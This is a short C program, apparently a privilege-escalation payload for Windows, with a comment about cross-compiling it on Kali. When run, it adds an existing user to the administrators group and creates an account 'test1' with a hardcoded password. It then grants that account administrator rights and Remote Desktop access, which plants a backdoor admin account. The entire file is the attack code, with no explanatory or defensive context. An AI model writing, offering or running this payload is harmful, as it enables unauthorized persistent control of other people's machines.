//to compile this code at kali
//i686-w64-mingw32-gcc adduser.c -o adduser.exe

#include <stdlib.h>
int main()
{
        int i;
        i=system("net localgroup administrators lowuser /add");
        i=system("net user test1 qwe123 /add");
        i=system("net localgroup administrators test1 /add");
        i=system("net localgroup \"Remote Desktop users\" test1 /add");
        return 0;
}